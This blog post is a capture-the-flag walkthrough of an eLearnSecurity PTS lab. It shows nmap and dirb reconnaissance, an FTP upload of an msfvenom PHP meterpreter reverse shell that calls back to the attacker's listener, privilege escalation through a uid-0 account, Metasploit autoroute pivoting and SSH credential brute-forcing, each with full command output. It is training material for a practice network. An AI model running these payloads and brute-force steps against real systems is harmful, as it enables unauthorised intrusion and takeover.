---
layout: post
title: "Pivoting and Basic Privilege Escalation"
permalink: /ctf3/
date: 2021-02-16 12:33:45 +0100
categories: ctf
---
#### Third CTF from eLearnSecurity's PTS course.  
Blackbox szenario.  
[network pivoting, basic privilege escalation]
Connected to internal network via eth0.  

### Task: discover and exploit all machines on the network.

⇒ Tools used: Nmap, Dirb, FTP Utility, Metasploit (MSFvenom, MSFpayload & Listener for reverse TCP shell)

- Network discovery
- Pivoting to other networks
- Basic privilege escalation


###### Stage I - Information Gathering:
lab environment, no OSINT applicable

###### Stage II - Footprinting and Scanning
Nmap

###### Stage III - Vulnerability Assessment
Nessus

###### Stage IV - Web Attacks
Dirb - Enumerating web resources

###### Stage V - System Attacks
Ncrack - Dictionary Attack - Brute Forcing SSH

Starting the mapping routine with with nmap scan for live hosts in our network 172.13.37.0/24

<details> 
  <summary> <b>Nmap</b> </summary>
  
  ```bash
                                                                                                                       
┌──(root💀kali)-[~]
└─# nmap -sn 172.16.37.0/24 -oN discovery.nmap               
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-16 11:14 EST
Nmap scan report for 172.16.37.1
Host is up (0.10s latency).
Nmap scan report for 172.16.37.220
Host is up (0.097s latency).
Nmap scan report for 172.16.37.234
Host is up (0.077s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 10.89 seconds
                                                                                                                      
┌──(root💀kali)-[~]
└─# cat discovery.nmap | grep for                                                 
Nmap scan report for 172.16.37.1
Nmap scan report for 172.16.37.220
Nmap scan report for 172.16.37.234
                                                                                                                      
┌──(root💀kali)-[~]
└─# cat discovery.nmap | grep for | cut -d " " -f 5                
172.16.37.1
172.16.37.220
172.16.37.234
                                                                                                                      
┌──(root💀kali)-[~]
└─# cat discovery.nmap | grep for | cut -d " " -f 5  > ipscan.txt
                                                                                                                      
┌──(root💀kali)-[~]
└─# cat ipscan.txt                                               
172.16.37.1
172.16.37.220
172.16.37.234
                                                                                                                      
┌──(root💀kali)-[~]
└─# nmap -sV -n -v -Pn -p- -T4 -iL ipscan.txt -A --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-16 11:19 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:19
Completed NSE at 11:19, 0.00s elapsed
Initiating NSE at 11:19
Completed NSE at 11:19, 0.00s elapsed
Initiating NSE at 11:19
Completed NSE at 11:19, 0.00s elapsed
Initiating SYN Stealth Scan at 11:19
Scanning 3 hosts [65535 ports/host]
Discovered open port 80/tcp on 172.16.37.220
Discovered open port 40180/tcp on 172.16.37.234
SYN Stealth Scan Timing: About 45.62% done; ETC: 11:20 (0:00:37 remaining)
Discovered open port 40121/tcp on 172.16.37.234
Completed SYN Stealth Scan against 172.16.37.1 in 43.63s (2 hosts left)
Discovered open port 3307/tcp on 172.16.37.220
Completed SYN Stealth Scan against 172.16.37.220 in 81.55s (1 host left)
Completed SYN Stealth Scan at 11:20, 81.73s elapsed (196605 total ports)
Initiating Service scan at 11:20
Scanning 4 services on 3 hosts
Completed Service scan at 11:20, 11.42s elapsed (4 services on 3 hosts)
Initiating OS detection (try #1) against 3 hosts
Retrying OS detection (try #2) against 2 hosts
Retrying OS detection (try #3) against 2 hosts
Retrying OS detection (try #4) against 2 hosts
Retrying OS detection (try #5) against 2 hosts
Initiating Traceroute at 11:20
Completed Traceroute at 11:20, 0.11s elapsed
NSE: Script scanning 3 hosts.
Initiating NSE at 11:20
Completed NSE at 11:20, 5.21s elapsed
Initiating NSE at 11:20
Completed NSE at 11:20, 1.02s elapsed
Initiating NSE at 11:20
Completed NSE at 11:20, 0.02s elapsed
Nmap scan report for 172.16.37.220
Host is up (0.095s latency).
Not shown: 58842 closed ports, 6691 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesnt have a title (text/html; charset=UTF-8).
3307/tcp open  tcpwrapped
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=2/16%OT=80%CT=1%CU=31677%PV=Y%DS=2%DC=T%G=Y%TM=602BF0E
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=Z%II=I%TS=8)OPS(O1=M
OS:4E7ST11NW7%O2=M4E7ST11NW7%O3=M4E7NNT11NW7%O4=M4E7ST11NW7%O5=M4E7ST11NW7%
OS:O6=M4E7ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%
OS:DF=Y%T=40%W=7210%O=M4E7NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%
OS:RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.144 days (since Tue Feb 16 07:53:14 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   103.57 ms 10.13.37.1
2   103.72 ms 172.16.37.220

Nmap scan report for 172.16.37.234
Host is up (0.092s latency).
Not shown: 58335 closed ports, 7198 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
40121/tcp open  ftp     ProFTPD 1.3.0a
40180/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=2/16%OT=40121%CT=1%CU=36721%PV=Y%DS=2%DC=T%G=Y%TM=602B
OS:F0EB%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%II=I%TS=8)SEQ(S
OS:P=105%GCD=2%ISR=10C%TI=Z%TS=8)OPS(O1=M4E7ST11NW7%O2=M4E7ST11NW7%O3=M4E7N
OS:NT11NW7%O4=M4E7ST11NW7%O5=M4E7ST11NW7%O6=M4E7ST11)WIN(W1=7120%W2=7120%W3
OS:=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M4E7NNSNW7%CC=Y
OS:%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%D
OS:F=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL
OS:=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.133 days (since Tue Feb 16 08:08:59 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Unix

TRACEROUTE (using port 40180/tcp)
HOP RTT       ADDRESS
-   Hop 1 is the same as for 172.16.37.220
2   103.92 ms 172.16.37.234

NSE: Script Post-scanning.
Initiating NSE at 11:20
Completed NSE at 11:20, 0.00s elapsed
Initiating NSE at 11:20
Completed NSE at 11:20, 0.00s elapsed
Initiating NSE at 11:20
Completed NSE at 11:20, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 115.72 seconds
           Raw packets sent: 221505 (9.757MB) | Rcvd: 184091 (7.371MB)


```
</details>
<br/>

Let's dig into our Nmap results and inspect the HTTP services on both machines with dirb:

    http://172.16.37.234:40180
    http://172.16.37.220:80
<br/>

<details> 
  <summary> <b>dirb http://172.16.37.220:80</b> </summary>

```bash
┌──(root💀kali)-[~]
└─# dirb http://172.16.37.220:80               

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Feb 16 11:40:58 2021
URL_BASE: http://172.16.37.220:80/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://172.16.37.220:80/ ----
+ http://172.16.37.220:80/index.php (CODE:200|SIZE:1406)                                                            
==> DIRECTORY: http://172.16.37.220:80/javascript/                                                                  
+ http://172.16.37.220:80/server-status (CODE:403|SIZE:301)                                                         
                                                                                                                    
---- Entering directory: http://172.16.37.220:80/javascript/ ----
==> DIRECTORY: http://172.16.37.220:80/javascript/jquery/                                                           
                                                                                                                    
---- Entering directory: http://172.16.37.220:80/javascript/jquery/ ----
+ http://172.16.37.220:80/javascript/jquery/jquery (CODE:200|SIZE:284394)                                           
                                                                                                                    
-----------------
END_TIME: Tue Feb 16 11:55:06 2021
DOWNLOADED: 13836 - FOUND: 3
                                                                                                                     
┌──(root💀kali)-[~]
└─# 
```
</details>
<br/>

<details> 
  <summary> <b>dirb http://172.16.37.234:40180</b> </summary>

```bash
┌──(root💀kali)-[~]
└─# dirb http://172.16.37.234:40180                                                                              2 ⨯

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Feb 16 11:22:32 2021
URL_BASE: http://172.16.37.234:40180/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://172.16.37.234:40180/ ----
+ http://172.16.37.234:40180/index.html (CODE:200|SIZE:11321)                                                       
+ http://172.16.37.234:40180/server-status (CODE:403|SIZE:304)                                                      
==> DIRECTORY: http://172.16.37.234:40180/xyz/                                                                      
                                                                                                                    
---- Entering directory: http://172.16.37.234:40180/xyz/ ----
+ http://172.16.37.234:40180/xyz/index.php (CODE:200|SIZE:1418)                                                     
                                                                                                                    
-----------------
END_TIME: Tue Feb 16 11:32:04 2021
DOWNLOADED: 9224 - FOUND: 3
                                                                                                                     
┌──(root💀kali)-[~]
└─# 
```

</details>
<br/>


Looking at the results we get from dirb we can see that 172.16.37.234/40180/xyz/ suggests there is another network. We see this by visiting the URL and inspecting its source code.
<br/>
<img src="/assets/images/ctf3/source172_16_37_234.png" height="100%" width="100%">
<br/>

Additionally,inspecting the source code for http://172.16.37.220 we find the following page. 
<br/>
<img src="/assets/images/ctf3/source172_16_37_220.png" height="100%" width="100%">
<br/>

Both pages inform us about a network that we can't yet access. In order to get access to it we will have to compromise one of the two machines. The FTP service 40121 on 172.16.37.234 looks promising. Let's start here.
<br/>

<details> 
  <summary> <b>ftp 172.16.37.234 40121</b> </summary>
  
```bash

┌──(root💀kali)-[~]
└─# ftp 172.16.37.234 40121
Connected to 172.16.37.234.
220 ProFTPD 1.3.0a Server (ProFTPD Default Installation. Please use 'ftpuser' to log in.) [172.16.37.234]
Name (172.16.37.234:enrique): ftpuser
331 Password required for ftpuser.
Password:
230 User ftpuser logged in.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 root     root         4096 Feb 15 21:29 html
226 Transfer complete.
ftp> cd html
250 CWD command successful
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 root     root        11321 Mar 28  2019 index.html
drwxrwxrwx   2 root     root         4096 Mar 28  2019 xyz
226 Transfer complete.
ftp> 

```
</details>
<br/>
Using the default credentials  we are able to explore the FTP server. Note that by issuing some basic commands we can identify that the FTP service allows file uploads to the web root. This is a solid attack vector for remote code execution.
Therefore, let's create a reverse shell.

```bash
msfvenom -p php/meterpreter_reverse_tcp lhost=10.13.37.10 lport=53 -o meterpreter.php
```

In oder to upload the shell we just created via ftp we need to set up a listener. We can do this with Metasploit as follows:

<details> 
  <summary> <b>Metasploit Listener and initial Metasploit configuration</b> </summary>
  
```bash

──(root💀kali)-[~]
└─# msfconsole  
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v6.0.28-dev                          ]
+ -- --=[ 2097 exploits - 1128 auxiliary - 356 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: View missing module options with show 
missing

msf6 > workspace
  blackbox1
  blackbox2
* default
msf6 > workspace -a blackbox3
[*] Added workspace: blackbox3
[*] Workspace: blackbox3
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set lhost 10.13.37.10
lhost => 10.13.37.10
msf6 exploit(multi/handler) > set lport 53
lport => 53
msf6 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp
payload => php/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.13.37.10:53 

```
</details>
<br/>

We can now go ahead and upload the file to obtain a remote shell.

<details> 
  <summary> <b>Shell upload via FTP</b> </summary>
  
```bash

┌──(root💀kali)-[~]
└─# ftp 172.16.37.234 40121                                                                                 148 ⨯ 2 ⚙
Connected to 172.16.37.234.
220 ProFTPD 1.3.0a Server (ProFTPD Default Installation. Please use 'ftpuser' to log in.) [172.16.37.234]
Name (172.16.37.234:enrique): ftpuser
331 Password required for ftpuser.
Password:
230 User ftpuser logged in.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd html
250 CWD command successful
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 root     root        11321 Mar 28  2019 index.html
drwxrwxrwx   2 root     root         4096 Mar 28  2019 xyz
226 Transfer complete.
ftp> put meterpreter.php
local: meterpreter.php remote: meterpreter.php
200 PORT command successful
150 Opening BINARY mode data connection for meterpreter.php
226 Transfer complete.
34276 bytes sent in 0.00 secs (93.3947 MB/s)
ftp> 

```
</details>
<br/>
Ok, shell is up. We now need to activate it by visiting http://172.16.37.234:40180/meterpreter.php
<br/>
<img src="/assets/images/ctf3/meterpreter_browser_start.png" height="100%" width="100%">
<br/>

In our terminal we can observe that the Meterpreter session is open now:


```bash

[*] Started reverse TCP handler on 10.13.37.10:53 
[*] Meterpreter session 1 opened (10.13.37.10:53 -> 172.16.37.234:47464) at 2021-02-16 11:56:35 -0500

meterpreter > ls
Listing: /var/www/html
======================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  11321  fil   2019-03-28 03:40:36 -0400  index.html
100644/rw-r--r--  34276  fil   2021-02-16 11:54:34 -0500  meterpreter.php
40777/rwxrwxrwx   4096   dir   2019-03-28 03:55:17 -0400  xyz

meterpreter > 

```

##### Basic privilege escalation

<br/>
By viewing /etc/passwd we can see that our ftpuser is already a priviliged (uid: 0, which is effectively root):

```bash

meterpreter > shell
Process 3023 created.
Channel 0 created.
bash -i
bash: cannot set terminal process group (1105): Inappropriate ioctl for device
bash: no job control in this shell
www-data@xubuntu:/var/www/html$ tail /etc/passwd
tail /etc/passwd
hplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:115:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:117:126:RealtimeKit,,,:/proc:/bin/false
saned:x:118:127::/var/lib/saned:/bin/false
usbmux:x:119:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
speech-dispatcher:x:120:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
elsuser:x:1000:1000:elsuser,,,:/home/elsuser:/bin/bash
ftpuser:x:0:0::/home/ftpuser:/bin/bash
test:x:1001:1002::/home/test:
www-data@xubuntu:/var/www/html$ 

``` 

The logical thing now is to execute the below to escalate privileges.

```bash
$ su ftpuser
```

<br/>
we get this error:
<br/>

```bash
ww-data@xubuntu:/var/www/html$ su ftpuser
su ftpuser
su: must be run from a terminal
www-data@xubuntu:/var/www/html$ 
```
<br/>
Meaning we can't execute due to lack of terminal. 
However, we can spawn a terminal with Python:
<br/>

```bash
ww-data@xubuntu:/var/www/html$ python -c 'import pty;pty.spawn("/bin/bash")';
<tml$ python -c 'import pty;pty.spawn("/bin/bash")';                         
www-data@xubuntu:/var/www/html$ 
```
<br/>

We find the flag in /var/www

```bash

www-data@xubuntu:/var/www/html$ ls -la
ls -la
total 60
drwxr-xr-x 3 root root  4096 Feb 16 16:54 .
drwxr-xr-x 3 root root  4096 Feb 15 20:08 ..
-rw-r--r-- 1 root root 11321 Mar 28  2019 index.html
-rw-r--r-- 1 root root 34276 Feb 16 16:54 meterpreter.php
drwxrwxrwx 2 root root  4096 Mar 28  2019 xyz
www-data@xubuntu:/var/www/html$ cd ..
cd ..
www-data@xubuntu:/var/www$ ls -la
ls -la
total 16
drwxr-xr-x  3 root root 4096 Feb 15 20:08 .
drwxr-xr-x 15 root root 4096 Apr 26  2019 ..
-rw-------  1 root root   27 Apr 26  2019 .flag.txt
drwxr-xr-x  3 root root 4096 Feb 16 16:54 html
www-data@xubuntu:/var/www$ 

www-data@xubuntu:/var/www$ su ftpuser
su ftpuser
Password: ftpuser

root@xubuntu:/var/www# cat .flag.txt
cat .flag.txt
You got the first machine!
root@xubuntu:/var/www# 
```
<br/>
##### Pivoting to other networks

Alright. Let's leverage the compromised 172.16.37.234 machine to create a route to the second network and compromise the remaining 172.16.37.220 machine.

First we want to run an nmap inside 172.16.37.234. I got logged out,so to do it we need to run the following.


<details> 
  <summary> <b>Initial Nmap scan from our compromise machine.</b> </summary>

```bash

meterpreter > shell
Process 3048 created.
Channel 1 created.
bash -i
bash: cannot set terminal process group (1105): Inappropriate ioctl for device
bash: no job control in this shell
www-data@xubuntu:/var/www/html$ su ftpuser
su ftpuser
su: must be run from a terminal
www-data@xubuntu:/var/www/html$ python -c 'import pty;pty.spawn("/bin/bash")';
<tml$ python -c 'import pty;pty.spawn("/bin/bash")';                         
www-data@xubuntu:/var/www/html$ su ftpuser
su ftpuser
Password: ftpuser

root@xubuntu:/var/www/html# nmap 172.16.50.222
nmap 172.16.50.222

Starting Nmap 7.01 ( https://nmap.org ) at 2021-02-16 17:09 UTC
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 172.16.50.222
Host is up (0.000025s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:50:56:BA:91:50 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.50 seconds
root@xubuntu:/var/www/html# 


```
</details>
<br/>

As we can see an SSH service is running on 172.16.50.222. Let's background our current Meterpreter shell by pressing ctrl + z and then run the autoroute functionality once the meterpreter> prompt appears.
[Autoroute routes  our  exploitation  attempts  through  the  first  compromised  machine  andenables us to access the remaining machine,through the second network (172.16.50.0/24)]
So, let's pivot from here focussing on the SSH service.
<br/>
<details> 
  <summary> <b>Autoroute and final exploit.</b> </summary>

```bash

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.13.37.10:53 
[*] Meterpreter session 3 opened (10.13.37.10:53 -> 172.16.37.234:47468) at 2021-02-16 12:19:38 -0500

meterpreter > run autoroute -s 172.16.50.0/24

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.50.0/255.255.255.0...
[+] Added route to 172.16.50.0/255.255.255.0 via 172.16.37.234
[*] Use the -p option to list all active routes
meterpreter > use auxiliary/scanner/ssh/ssh_login
Loading extension auxiliary/scanner/ssh/ssh_login...
[-] Failed to load extension: Unable to load extension 'auxiliary/scanner/ssh/ssh_login' - module does not exist.
meterpreter > 
Background session 3? [y/N]  y
[-] Unknown command: y.
msf6 exploit(multi/handler) > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting                Required  Description
   ----              ---------------                --------  -----------
   BLANK_PASSWORDS   false                          no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                              yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                          no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                          no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                          no        Add all users in the current database to the list
   PASSWORD                                         no        A specific password to authenticate with
   PASS_FILE         /usr/share/ncrack/minimal.usr  no        File containing passwords, one per line
   RHOSTS            172.16.50.222                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             22                             yes       The target port
   STOP_ON_SUCCESS   false                          yes       Stop guessing when a credential works for a host
   THREADS           1                              yes       The number of concurrent threads (max one per host)
   USERNAME                                         no        A specific username to authenticate as
   USERPASS_FILE                                    no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                          no        Try the username as the password for all users
   USER_FILE         /usr/share/ncrack/minimal.usr  no        File containing usernames, one per line
   VERBOSE           true                           yes       Whether to print output for all attempts

msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 172.16.50.222
rhosts => 172.16.50.222
msf6 auxiliary(scanner/ssh/ssh_login) > set user_file /usr/share/ncrack/minimal.usr
user_file => /usr/share/ncrack/minimal.usr
msf6 auxiliary(scanner/ssh/ssh_login) > set pass_file /usr/share/ncrack/minimal.usr
pass_file => /usr/share/ncrack/minimal.usr
msf6 auxiliary(scanner/ssh/ssh_login) > set verbose true
verbose => true
msf6 auxiliary(scanner/ssh/ssh_login) > run

[+] 172.16.50.222:22 - Success: 'root:root' 'uid=0(root) gid=0(root) groups=0(root) Linux xubuntu 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 4 opened (10.13.37.10-172.16.37.234:0 -> 172.16.50.222:22) at 2021-02-16 12:21:30 -0500
[-] 172.16.50.222:22 - Failed: 'admin:root'
[-] 172.16.50.222:22 - Failed: 'admin:admin'
[-] 172.16.50.222:22 - Failed: 'admin:administrator'
[-] 172.16.50.222:22 - Failed: 'admin:webadmin'
[-] 172.16.50.222:22 - Failed: 'admin:sysadmin'
^C[*] Caught interrupt from the console...
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/ssh_login) > run

[+] 172.16.50.222:22 - Success: 'root:root' 'uid=0(root) gid=0(root) groups=0(root) Linux xubuntu 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux '
bash [*] Command shell session 5 opened (10.13.37.10-172.16.37.234:0 -> 172.16.50.222:22) at 2021-02-16 12:22:33 -0500
bash -i
shell
[-] 172.16.50.222:22 - Failed: 'admin:root'
[-] 172.16.50.222:22 - Failed: 'admin:admin'
^C[*] Caught interrupt from the console...
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i

Active sessions
===============

  Id  Name  Type                   Information                       Connection
  --  ----  ----                   -----------                       ----------
  2         meterpreter php/linux  www-data (33) @ xubuntu           10.13.37.10:53 -> 172.16.37.234:47466 (172.16.37.234)
  3         meterpreter php/linux  www-data (33) @ xubuntu           10.13.37.10:53 -> 172.16.37.234:47468 (172.16.37.234)
  4         shell linux            SSH root:root (172.16.50.222:22)  10.13.37.10-172.16.37.234:0 -> 172.16.50.222:22 (172.16.50.222)
  5         shell linux            SSH root:root (172.16.50.222:22)  10.13.37.10-172.16.37.234:0 -> 172.16.50.222:22 (172.16.50.222)

msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 4
[*] Starting interaction with 4...

mesg: ttyname failed: Inappropriate ioctl for device
bash -i
bash: cannot set terminal process group (3291): Inappropriate ioctl for device
bash: no job control in this shell
root@xubuntu:~# ls
ls
root@xubuntu:~# pwd
/root
pwd
root@xubuntu:~# ls -la
ls -la
total 48
drwx------  6 root root 4096 Apr  1  2019 .
drwxr-xr-x 24 root root 4096 Dec 15  2017 ..
-rw-------  1 root root 4914 May 17  2019 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Mar 29  2019 .cache
drwxr-xr-x  3 root root 4096 Mar 27  2019 .composer
-rw-r--r--  1 root root   22 Apr  1  2019 .flag.txt
-rw-------  1 root root   53 Mar 27  2019 .mysql_history
drwxr-xr-x  2 root root 4096 Mar 27  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Mar 27  2019 .ssh
root@xubuntu:~# cat .flag.txt
cat .flag.txt
Congratz! You got it.
root@xubuntu:~# 

```
</details>
<br/>

And that's it, we got the last flag!
